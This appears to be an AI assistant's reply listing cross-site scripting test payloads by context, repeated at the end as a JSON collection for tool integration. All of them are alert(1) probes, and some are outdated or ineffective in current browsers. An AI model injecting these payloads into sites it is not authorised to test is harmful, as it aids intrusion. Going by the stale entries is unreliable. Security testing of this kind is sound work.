Here’s a comprehensive list of all major types of XSS payloads, categorized by context and attack method. These are useful for testing applications for XSS vulnerabilities in different areas:


---

1. Basic Payloads

```html

<script>alert(1)</script>
<svg onload=alert(1)>
<img src=x onerror=alert(1)>
<iframe src="javascript:alert(1)"></iframe>
<body onload=alert(1)>
<video><source onerror="alert(1)">

```

---

2. Attribute Injection

```html
"><img src=x onerror=alert(1)>
"><input onfocus=alert(1) autofocus>
"><div onmouseover=alert(1)>hover me</div>
"><a href="javascript:alert(1)">click</a>

```

---

3. DOM-based XSS

```html
// URL: http://example.com/#<script>alert(1)</script>
document.location.hash
document.URL
document.write(untrusted_input)
location.href

Payload example for DOM sink:

<script>document.write(location.hash)</script>
```


---

4. Event Handler Payloads

```html
<svg onload=alert(1)>
<marquee onstart=alert(1)>
<math href="javascript:alert(1)">
<button onclick=alert(1)>Click</button>
<details open ontoggle=alert(1)>
```


---

5. Obfuscated Payloads

```html
<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
<IMG SRC=JaVaScRiPt:alert(1)>
<svg oNLoAd=alert(1)>
```


---

6. Inline JavaScript Context

```html
" onerror="alert(1)
' onerror='alert(1)
"><script>alert(1)</script>
```


---

7. JavaScript URI Payloads

```html
<a href="javascript:alert(1)">Click</a>
<iframe src="javascript:alert(1)"></iframe>
```


---

```html
8. JSON/JavaScript Injection

{"name":"<script>alert(1)</script>"}

var data = "<img src=x onerror=alert(1)>";
```


---

9. CSS Injection (in rare cases)

```html
<style>@import 'javascript:alert(1)';</style>
<div style="background:url(javascript:alert(1))">


---

10. AngularJS/VueJS Context (Template Injection)

```html
{{constructor.constructor('alert(1)')()}}
{{alert(1)}}
```


---

11. Inline SVG Injection

```html
<svg><script>alert(1)</script></svg>
<svg><a xlink:href="javascript:alert(1)">CLICK</a></svg>
```


---

12. HTML5 Form Elements

```html
<keygen autofocus onfocus=alert(1)>
<meter value=100 min=0 max=200 onmouseover=alert(1)>
<progress value=100 max=200 onmouseover=alert(1)>
```

---

Would you like a downloadable list or JSON/CSV format for automation or tool integration?

```json
{
  "basic_payloads": [
    "<script>alert(1)</script>",
    "<svg onload=alert(1)>",
    "<img src=x onerror=alert(1)>",
    "<iframe src=\"javascript:alert(1)\"></iframe>",
    "<body onload=alert(1)>",
    "<video><source onerror=\"alert(1)\">"
  ],
  "attribute_injection": [
    "\"><img src=x onerror=alert(1)>",
    "\"><input onfocus=alert(1) autofocus>",
    "\"><div onmouseover=alert(1)>hover me</div>",
    "\"><a href=\"javascript:alert(1)\">click</a>"
  ],
  "dom_based_xss": [
    "<script>document.write(location.hash)</script>",
    "<script>document.write(document.URL)</script>"
  ],
  "event_handler_payloads": [
    "<svg onload=alert(1)>",
    "<marquee onstart=alert(1)>",
    "<math href=\"javascript:alert(1)\">",
    "<button onclick=alert(1)>Click</button>",
    "<details open ontoggle=alert(1)>"
  ],
  "obfuscated_payloads": [
    "<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>",
    "<IMG SRC=JaVaScRiPt:alert(1)>",
    "<svg oNLoAd=alert(1)>"
  ],
  "inline_javascript": [
    "\" onerror=\"alert(1)",
    "' onerror='alert(1)",
    "\"><script>alert(1)</script>"
  ],
  "javascript_uri": [
    "<a href=\"javascript:alert(1)\">Click</a>",
    "<iframe src=\"javascript:alert(1)\"></iframe>"
  ],
  "json_js_injection": [
    "{\"name\":\"<script>alert(1)</script>\"}",
    "var data = \"<img src=x onerror=alert(1)>\";"
  ],
  "css_injection": [
    "<style>@import 'javascript:alert(1)';</style>",
    "<div style=\"background:url(javascript:alert(1))\">"
  ],
  "angular_vue_template_injection": [
    "{{constructor.constructor('alert(1)')()}}",
    "{{alert(1)}}"
  ],
  "svg_injection": [
    "<svg><script>alert(1)</script></svg>",
    "<svg><a xlink:href=\"javascript:alert(1)\">CLICK</a></svg>"
  ],
  "html5_elements": [
    "<keygen autofocus onfocus=alert(1)>",
    "<meter value=100 min=0 max=200 onmouseover=alert(1)>",
    "<progress value=100 max=200 onmouseover=alert(1)>"
  ]
}
```
